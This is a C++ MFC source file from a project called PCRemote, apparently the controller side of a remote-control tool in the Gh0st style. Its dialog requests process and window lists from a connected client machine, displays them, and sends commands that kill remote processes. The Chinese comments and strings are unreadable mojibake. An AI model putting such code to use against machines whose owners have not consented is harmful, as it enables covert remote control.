// SystemDlg.cpp : ʵ���ļ�
//

#include "stdafx.h"
#include "PCRemote.h"
#include "SystemDlg.h"
#include "afxdialogex.h"
#include "..\common\macros.h"

// CSystemDlg �Ի���
COLUMNSTRUCT g_Column_Process_Data[] =
{
	{"ӳ������", 100},
	{"PID",		 50},
	{"����·��", 400}
};

COLUMNSTRUCT g_Column_Windows_Data[] =
{
	{"PID",		 50},
	{"��������", 300}
};

IMPLEMENT_DYNAMIC(CSystemDlg, CDialogEx)

CSystemDlg::CSystemDlg(CWnd* pParent, CIOCPServer* pIOCPServer, ClientContext *pContext)
	: CDialogEx(CSystemDlg::IDD, pParent)
{
	m_bAsc = TRUE;
	m_nSortCol = 2;
	m_iocpServer = pIOCPServer;
	m_pContext = pContext;
	m_hIcon = LoadIcon(AfxGetInstanceHandle(), MAKEINTRESOURCE(IDI_SYSTEM));
}

CSystemDlg::~CSystemDlg()
{
}

void CSystemDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialogEx::DoDataExchange(pDX);
	DDX_Control(pDX, IDC_TAB1, m_tab);
	DDX_Control(pDX, IDC_LIST_PROCESS, m_list_process);
	DDX_Control(pDX, IDC_LIST_WINDOWS, m_list_windows);
}


BEGIN_MESSAGE_MAP(CSystemDlg, CDialogEx)
	ON_WM_CLOSE()
	ON_WM_SIZE()
	ON_NOTIFY(TCN_SELCHANGE, IDC_TAB1, &CSystemDlg::OnTcnSelchangeTab1)
	ON_COMMAND(IDM_KILLPROCESS, &CSystemDlg::OnKillprocess)
	ON_COMMAND(IDM_REFRESHPSLIST, &CSystemDlg::OnRefreshpslist)
	ON_NOTIFY(NM_RCLICK, IDC_LIST_PROCESS, &CSystemDlg::OnNMRClickListProcess)
	ON_NOTIFY(LVN_COLUMNCLICK, IDC_LIST_PROCESS, &CSystemDlg::OnLvnColumnclickListProcess)
END_MESSAGE_MAP()


// CSystemDlg ��Ϣ�������


void CSystemDlg::AdjustList()
{
	if (m_list_process.m_hWnd==NULL)
	{
		return;
	}
	if (m_list_windows.m_hWnd==NULL)
	{
		return;
	}

	RECT rectTab;
	RECT	rectClient;
	RECT	rectList;
	GetClientRect(&rectClient);

	rectTab.left = 0;
	rectTab.top = 10;
	rectTab.right = rectClient.right;
	rectTab.bottom = 29;
	m_tab.MoveWindow(&rectTab);

	rectList.left = 0;
	rectList.top = 29;
	rectList.right = rectClient.right;
	rectList.bottom = rectClient.bottom;

	m_list_process.MoveWindow(&rectList);
	m_list_windows.MoveWindow(&rectList);

	for (int i =0; i < 3; i++)
	{
		double dd = g_Column_Process_Data[i].nWidth;
		dd /= m_ProcessListWidth;
		dd *= rectClient.right;
		int len = dd;
		m_list_process.SetColumnWidth(i, len);
	}

	for (int i = 0; i < 2; i++)
	{
		double dd = g_Column_Windows_Data[i].nWidth;
		dd /= m_WindowsListWidth;
		dd *= rectClient.right;
		int len = dd;
		m_list_windows.SetColumnWidth(i, len);
	}
}


void CSystemDlg::OnClose()
{
	// TODO: �ڴ������Ϣ�����������/�����Ĭ��ֵ
	m_pContext->m_Dialog[0] = 0;
	closesocket(m_pContext->m_Socket);
	CDialogEx::OnClose();
}


void CSystemDlg::OnSize(UINT nType, int cx, int cy)
{
	CDialogEx::OnSize(nType, cx, cy);
	AdjustList();
	// TODO: �ڴ˴������Ϣ����������
}


void CSystemDlg::OnTcnSelchangeTab1(NMHDR *pNMHDR, LRESULT *pResult)
{
	// TODO: �ڴ���ӿؼ�֪ͨ����������
	ShowSelectWindow();
	*pResult = 0;
}


void CSystemDlg::ShowSelectWindow(void)
{
	switch (m_tab.GetCurSel())
	{
	case 0:
		m_list_windows.ShowWindow(SW_HIDE);
		m_list_process.ShowWindow(SW_SHOW);
		if(m_list_process.GetItemCount() == 0)
			GetProcessList();
		break;
	case 1:
		m_list_windows.ShowWindow(SW_SHOW);
		m_list_process.ShowWindow(SW_HIDE);
		if(m_list_windows.GetItemCount() == 0)
			GetWindowsList();
		break;
	default:
		break;
	}
}


void CSystemDlg::GetProcessList(void)
{
	BYTE bToken = COMMAND_PSLIST;
	m_iocpServer->Send(m_pContext, &bToken, sizeof(BYTE));
}

void CSystemDlg::GetWindowsList(void)
{
	BYTE bToken = COMMAND_WSLIST;
	m_iocpServer->Send(m_pContext, &bToken, sizeof(BYTE));
}

BOOL CSystemDlg::OnInitDialog()
{
	CDialogEx::OnInitDialog();

	// TODO:  �ڴ���Ӷ���ĳ�ʼ��
	SetIcon(m_hIcon, TRUE);
	SetIcon(m_hIcon, FALSE);

	//�õ��ͻ��˵�IP����ʾ�����ڵı���
	CString str;
	sockaddr_in sockAddr;
	ZeroMemory(&sockAddr, sizeof(sockAddr));
	int nSockAddrLen = sizeof(sockAddr);
	int nResult = getpeername(m_pContext->m_Socket, (SOCKADDR*)&sockAddr, &nSockAddrLen);
	str.Format("\\\\%s - ϵͳ����", (nResult != SOCKET_ERROR) ? inet_ntoa(sockAddr.sin_addr) : "");
	SetWindowText(str);

	m_tab.InsertItem(0, "���̹���");
	m_tab.InsertItem(1, "���ڹ���");

	m_list_process.SetExtendedStyle(LVS_EX_FLATSB | LVS_EX_FULLROWSELECT);  //��ʼ�����̵��б�
	m_list_process.InsertColumn(0, "ӳ������", LVCFMT_LEFT, 100);
	m_list_process.InsertColumn(1, "PID", LVCFMT_LEFT, 50);
	m_list_process.InsertColumn(2, "����·��", LVCFMT_LEFT, 400);
	m_ProcessListWidth = 100 + 50 + 400;

	m_list_windows.SetExtendedStyle(LVS_EX_FLATSB | LVS_EX_FULLROWSELECT);  //��ʼ�� ���ڹ�����б�
	m_list_windows.InsertColumn(0, "PID", LVCFMT_LEFT, 50);
	m_list_windows.InsertColumn(1, "��������", LVCFMT_LEFT, 300);
	m_WindowsListWidth = 50 + 300;

	AdjustList();			//�����б��С
	ShowProcessList();
	ShowSelectWindow();
	return TRUE;  // return TRUE unless you set the focus to a control
	// �쳣: OCX ����ҳӦ���� FALSE
}


void CSystemDlg::ShowProcessList(void)
{
	char *pBuffer = (char*)(m_pContext->m_DeCompressionBuffer.GetBuffer(1));
	DWORD dwOffset = 0;
	char *szExeFile;
	char *szProcessFullName;
	CString str;

	m_list_process.DeleteAllItems();

	//������������ÿһ���ַ��������������ݽṹ�� Id+������+0+������+0
	int i = 0;
	for (; dwOffset < m_pContext->m_DeCompressionBuffer.GetBufferLen()-1; i++)
	{
		DWORD *pdwID      = (DWORD*)(pBuffer + dwOffset);
		szExeFile         = pBuffer + dwOffset + sizeof(DWORD);
		szProcessFullName = szExeFile + lstrlen(szExeFile) + 1;

		m_list_process.InsertItem(i, szExeFile);
		str.Format("%5u", *pdwID);
		m_list_process.SetItemText(i, 1, str);
		m_list_process.SetItemText(i, 2, szProcessFullName);

		dwOffset += sizeof(DWORD) + lstrlen(szExeFile) + lstrlen(szProcessFullName) + 2;
	}

}

void CSystemDlg::ShowWindowsList(void)
{
	char *pBuffer = (char*)(m_pContext->m_DeCompressionBuffer.GetBuffer(1));
	DWORD dwOffset = 0;
	char *pTitle = NULL;
	CString strPID;
	m_list_windows.DeleteAllItems();

	for (int i = 0; dwOffset < m_pContext->m_DeCompressionBuffer.GetBufferLen() - 1; i++)
	{
		LPDWORD lpPID = LPDWORD(pBuffer + dwOffset);
		pTitle = pBuffer + dwOffset + sizeof(DWORD);
		strPID.Format("%5u", *lpPID);
		m_list_windows.InsertItem(i, strPID);
		m_list_windows.SetItemText(i, 1, pTitle);

		dwOffset += sizeof(DWORD) + lstrlen(pTitle) + 1;
	}
}


void CSystemDlg::OnKillprocess()
{
	// TODO: �ڴ���������������
	CListCtrl *pListCtrl = NULL;
	if(m_list_process.IsWindowEnabled())
		pListCtrl = &m_list_process;
	else if(m_list_windows.IsWindowEnabled())
		pListCtrl = &m_list_windows;
	else
		return ;

	LPBYTE pBuffer = (LPBYTE)LocalAlloc(LPTR, 1 + (pListCtrl->GetSelectedCount() * sizeof(DWORD)));
	pBuffer[0] = COMMAND_KILLPROCESS;

	//��ʾ������Ϣ
	char *lpTips = "����: ��ֹ���̻ᵼ�²�ϣ�������Ľ����\n"
		"�������ݶ�ʧ��ϵͳ���ȶ����ڱ���ֹǰ��\n"
		"���̽�û�л��ᱣ����״̬�����ݡ�";
	CString str;
	if (pListCtrl->GetSelectedCount() > 1)
	{
		str.Format("%sȷʵ\n����ֹ��%d�������?", lpTips, pListCtrl->GetSelectedCount());	
	}
	else
	{
		str.Format("%sȷʵ\n����ֹ���������?", lpTips);
	}
	if (::MessageBox(m_hWnd, str, "���̽�������", MB_YESNO|MB_ICONQUESTION) == IDNO)
		return;

	DWORD dwOffset = 1;
	POSITION pos = pListCtrl->GetFirstSelectedItemPosition();
	while(pos)
	{
		int nItem = pListCtrl->GetNextSelectedItem(pos);
		CString str = pListCtrl->GetItemText(nItem, 1);
		DWORD dwProcessID = atoi(str);
		memcpy(pBuffer  + dwOffset, &dwProcessID, sizeof(DWORD));
		dwOffset += sizeof(DWORD);
	}

	//�������ݵ��ͻ��ˣ��ͻ��˲���COMMAND_KILLPROCESS�������ͷ
	m_iocpServer->Send(m_pContext, pBuffer, LocalSize(pBuffer));
	LocalFree(pBuffer);
}




void CSystemDlg::OnRefreshpslist()
{
	// TODO: �ڴ���������������
	if(m_list_process.IsWindowVisible())
		GetProcessList();
}


void CSystemDlg::OnNMRClickListProcess(NMHDR *pNMHDR, LRESULT *pResult)
{
	LPNMITEMACTIVATE pNMItemActivate = reinterpret_cast<LPNMITEMACTIVATE>(pNMHDR);
	// TODO: �ڴ���ӿؼ�֪ͨ����������
	CMenu popup;
	popup.LoadMenu(IDR_PSLIST);
	CMenu *pMenuSub = popup.GetSubMenu(0);
	CPoint p;
	GetCursorPos(&p);

	if (m_list_process.GetSelectedCount() == 0)
	{
		pMenuSub->EnableMenuItem(0, MF_BYPOSITION | MF_DISABLED | MF_GRAYED);
	}
	pMenuSub->TrackPopupMenu(TPM_LEFTALIGN, p.x, p.y, this);
	*pResult = 0;
}


void CSystemDlg::OnReceiveComplete(void)
{
	switch(m_pContext->m_DeCompressionBuffer.GetBuffer(0)[0])
	{
	case TOKEN_PSLIST:
		ShowProcessList();
		break;
	case TOKEN_WSLIST:
		ShowWindowsList();
		break;		
	default:
		break;
	}
}


void CSystemDlg::OnLvnColumnclickListProcess(NMHDR *pNMHDR, LRESULT *pResult)
{
	LPNMLISTVIEW pNMLV = reinterpret_cast<LPNMLISTVIEW>(pNMHDR);
	// TODO: �ڴ���ӿؼ�֪ͨ����������
	if(pNMLV->iSubItem != 0 && pNMLV->iSubItem != 1)
		return;

	for(int i = 0; i < m_list_process.GetItemCount(); i++)
		m_list_process.SetItemData(i ,i);

	if (pNMLV->iSubItem == m_nSortCol)
	{
		m_bAsc = !m_bAsc;
	} 
	else
	{
		m_bAsc = TRUE;
		m_nSortCol = pNMLV->iSubItem;
	}

	m_list_process.SortItems(&CSystemDlg::MyCompareProc, (DWORD)this);

	*pResult = 0;
}


int CALLBACK CSystemDlg::MyCompareProc(LPARAM lParam1, LPARAM lParam2, LPARAM lParamSort)
{
	CSystemDlg *pdlg = (CSystemDlg *)lParamSort;
	int nCompRes;
	switch (pdlg->m_nSortCol)
	{
	case 0:
		{
			CString strItem1 = pdlg->m_list_process.GetItemText(lParam1, 0);
			CString strItem2 = pdlg->m_list_process.GetItemText(lParam2, 0);
			nCompRes = strItem1.CompareNoCase(strItem2);
		}
		break;
	case 1:
		{
			CString strItem1 = pdlg->m_list_process.GetItemText(lParam1, 1);
			int nItem1 = atoi(strItem1);
			CString strItem2 = pdlg->m_list_process.GetItemText(lParam2, 1);
			int nItem2 = atoi(strItem2);

			if(nItem1 == nItem2)
				nCompRes = 0;
			else
				nCompRes = nItem1 > nItem2 ? 1 : -1;
		}
		break;
	default:
		break;
	}

	if(pdlg->m_bAsc)
		return nCompRes;
	else
		return nCompRes*-1;
}




